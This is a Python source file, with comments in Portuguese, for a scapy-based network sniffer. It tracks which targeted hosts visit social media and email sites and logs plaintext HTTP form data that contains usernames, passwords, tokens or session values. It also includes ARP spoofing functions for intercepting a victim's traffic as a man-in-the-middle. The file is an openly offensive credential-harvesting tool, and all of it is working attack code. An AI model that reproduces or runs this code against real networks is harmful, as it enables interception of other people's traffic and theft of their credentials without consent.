import scapy.all as scapy
from scapy.layers import http
import re
import threading
import time
import os

# ==============================================================
# DSI SNIFFER - GRÃO-MESTRE SUPREMO (Deep Packet Inspection)
# ==============================================================

class DSISniffer:
    def __init__(self, interface, log_callback=None):
        self.interface = interface
        self.log_callback = log_callback
        self.is_running = False
        self.sniff_thread = None
        
        # Filtros de interesse (Redes Sociais e Senhas)
        self.social_domains = [
            "facebook.com", "instagram.com", "twitter.com", "x.com", 
            "linkedin.com", "tiktok.com", "snapchat.com", "whatsapp.com",
            "gmail.com", "google.com", "netflix.com"
        ]
        
        # Regex para capturar credenciais em texto claro (HTTP/Form Data)
        self.cred_keywords = [
            "user", "username", "login", "email", "pass", "password", 
            "key", "auth", "token", "session"
        ]

    def log(self, msg, log_type="info"):
        if self.log_callback:
            self.log_callback(msg, log_type)
        else:
            print(f"[*] {msg}")

    def process_packet(self, packet):
        # 1. Identifica Redes Sociais via DNS ou HTTP Host
        if packet.haslayer(scapy.DNSQR):
            qname = packet[scapy.DNSQR].qname.decode('utf-8').lower()
            for domain in self.social_domains:
                if domain in qname:
                    src_ip = packet[scapy.IP].src
                    self.log(f"[SOCIAL RADAR] Alvo {src_ip} acessando: {domain}", log_type="info")
                    break

        # 2. Identifica Credenciais em pacotes HTTP
        if packet.haslayer(http.HTTPRequest):
            url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
            method = packet[http.HTTPRequest].Method.decode()
            src_ip = packet[scapy.IP].src
            
            # Registra a navegação
            self.log(f"[HTTP {method}] {src_ip} -> {url}", log_type="info")

            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load.decode(errors='ignore').lower()
                for key in self.cred_keywords:
                    if key in load:
                        # Alerta Vermelho: Possível Credencial Detectada
                        self.log(f"!!! [ALERTA CREDENCIAL] Alvo: {src_ip} | Dados: {load[:200]}...", log_type="error")
                        break

    def start(self):
        if not self.is_running:
            self.is_running = True
            self.log(f"Iniciando Sniffer Magistrado na interface {self.interface}...", log_type="cmd")
            self.sniff_thread = threading.Thread(target=self._run_sniff, daemon=True)
            self.sniff_thread.start()

    def _run_sniff(self):
        try:
            # Sniffing infinito filtrando por IP
            scapy.sniff(iface=self.interface, store=False, prn=self.process_packet, stop_filter=self._stop_check)
        except Exception as e:
            self.log(f"Erro no motor de sniffing: {e}", log_type="error")
            self.is_running = False

    def _stop_check(self, packet):
        return not self.is_running

    def stop(self):
        self.is_running = False
        self.log("Sniffer Grão-Mestre desativado.", log_type="info")

# --- Ferramenta Auxiliar: ARP Spoofing (Intercepção) ---
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)

def restore_arp(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
